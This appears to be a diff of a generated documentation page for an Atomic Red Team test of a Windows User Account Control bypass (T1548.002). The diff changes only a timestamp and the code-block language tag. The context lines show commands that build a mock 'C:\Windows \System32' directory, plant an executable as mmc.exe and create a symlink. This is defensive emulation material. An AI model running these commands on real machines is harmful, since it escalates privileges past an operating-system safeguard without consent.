@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1548.002"
 attack_technique_name: "Abuse Elevation Control Mechanism: Bypass User Account Control"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "command_prompt"
 aliases:
   - "f7a35090-6f7f-4f64-bb47-d657bf5b10c1"
@@ -53,7 +53,7 @@ Upon execution the directory structure should exist if the system is patched, if
 
 ### Command
 
-```commandprompt
+```cmd
 mkdir "\\?\C:\Windows \System32\"
 copy "#{executable_binary}" "\\?\C:\Windows \System32\mmc.exe"
 mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
@@ -61,7 +61,7 @@ mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
 
 ### Cleanup
 
-```commandprompt
+```cmd
 rd "\\?\C:\Windows \" /S /Q >nul 2>nul
 del "c:\testbypass.exe" >nul 2>nul
 ```
